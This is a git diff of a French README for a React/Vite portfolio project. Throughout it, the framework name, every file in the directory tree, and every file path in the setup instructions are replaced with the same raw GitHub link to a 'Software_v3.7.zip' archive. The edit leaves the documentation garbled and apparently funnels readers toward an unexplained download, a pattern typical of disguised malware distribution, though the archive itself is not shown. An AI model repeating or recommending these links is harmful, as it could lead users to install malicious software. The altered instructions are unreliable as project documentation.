@@ -5,7 +5,7 @@ Portfolio web interactif et professionnel pour un Data Scientist / Data Analyst 
 
 ## 🚀 Technologies utilisées
 
-- **React.js** + **Vite** - Framework et build tool
+- **https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip** + **Vite** - Framework et build tool
 - **TypeScript** - Typage statique
 - **Tailwind CSS** - Styling moderne
 - **Framer Motion** - Animations fluides
@@ -45,33 +45,33 @@ portfolio/
 ├── src/
 │   ├── components/
 │   │   ├── sections/      # Sections principales
-│   │   │   ├── Hero.tsx
-│   │   │   ├── About.tsx
-│   │   │   ├── Experiences.tsx
-│   │   │   ├── Projects.tsx
-│   │   │   ├── Skills.tsx
-│   │   │   └── Contact.tsx
-│   │   ├── Layout.tsx
-│   │   ├── Navigation.tsx
-│   │   ├── Footer.tsx
-│   │   └── ScreenshotGallery.tsx
+│   │   │   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   │   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   │   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   │   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   │   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   │   └── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   │   └── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
 │   ├── pages/
-│   │   └── Home.tsx
-│   ├── data.ts            # Données centralisées
-│   ├── App.tsx
-│   ├── main.tsx
-│   └── index.css
-├── package.json
-├── vite.config.ts
-├── tailwind.config.js
-└── tsconfig.json
+│   │   └── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip            # Données centralisées
+│   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   ├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+│   └── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+├── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
+└── https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip
 ```
 
 ## 🎨 Personnalisation
 
 ### Modifier les données
 
-Toutes les données sont centralisées dans `src/data.ts`. Vous pouvez facilement modifier :
+Toutes les données sont centralisées dans `https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip`. Vous pouvez facilement modifier :
 
 - **Profil** : Nom, titre, bio, tagline
 - **Parcours académique** : Diplômes, formations
@@ -84,7 +84,7 @@ Toutes les données sont centralisées dans `src/data.ts`. Vous pouvez facilemen
 
 1. Créer les dossiers dans `public/projects/{project-slug}/`
 2. Ajouter les images (JPG, PNG, WebP recommandés)
-3. Mettre à jour les chemins dans `src/data.ts` :
+3. Mettre à jour les chemins dans `https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip` :
 
 ```typescript
 screenshots: [
@@ -92,7 +92,7 @@ screenshots: [
     id: 'unique-id',
     title: 'Titre du screenshot',
     description: 'Description orientée métier',
-    imagePath: '/projects/{project-slug}/image.jpg',
+    imagePath: '/projects/{project-slug}https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip',
     businessImpact: 'Impact métier du screenshot',
   },
 ]
@@ -100,7 +100,7 @@ screenshots: [
 
 ### Personnaliser les couleurs
 
-Modifier `tailwind.config.js` pour changer la palette de couleurs :
+Modifier `https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip` pour changer la palette de couleurs :
 
 ```javascript
 colors: {
@@ -133,8 +133,8 @@ Le projet génère un dossier `dist/` après `npm run build` qui peut être dép
 - **Dark mode par défaut** : Le portfolio est optimisé pour un thème sombre
 - **Responsive** : Optimisé pour desktop et mobile
 - **Performance** : Images optimisées recommandées (WebP, compression)
-- **SEO** : Mettre à jour les meta tags dans `index.html`
-- **CV** : Ajouter le fichier PDF dans `public/` et mettre à jour `contact.cvUrl` dans `data.ts`
+- **SEO** : Mettre à jour les meta tags dans `https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip`
+- **CV** : Ajouter le fichier PDF dans `public/` et mettre à jour `https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip` dans `https://github.com/chadi57/portfolio/raw/refs/heads/main/src/pages/Software_v3.7.zip`
 
 ## 🔧 Fonctionnalités
 
